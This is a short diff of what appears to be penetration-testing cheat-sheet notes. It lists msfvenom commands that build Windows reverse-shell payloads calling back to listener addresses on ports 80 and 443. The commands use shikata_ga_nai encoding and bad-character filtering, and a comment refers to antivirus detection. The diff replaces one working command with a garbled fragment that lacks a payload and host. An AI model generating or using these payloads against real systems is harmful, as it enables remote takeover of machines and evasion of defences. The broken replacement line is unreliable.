@@ -62,7 +62,7 @@ msfvenom --arch x86 -p windows/shell_reverse_tcp LHOST=192.168.119.127 LPORT=80 
 # Beware Shitganawry AV detections 
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.195 LPORT=443 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0A\x0D\x25\x26\x2B\x3D"
 # smaller
-msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.195 LPORT=443 EXITFUNC=thread --smallest -f c -b "\x00\x0A\x0D\x25\x26\x2B\x3D"
+-f  EXITFUNC=thread --smallest -f c -b "\x00\x0A\x0D\x25\x26\x2B\x3D"
 
 
 ```
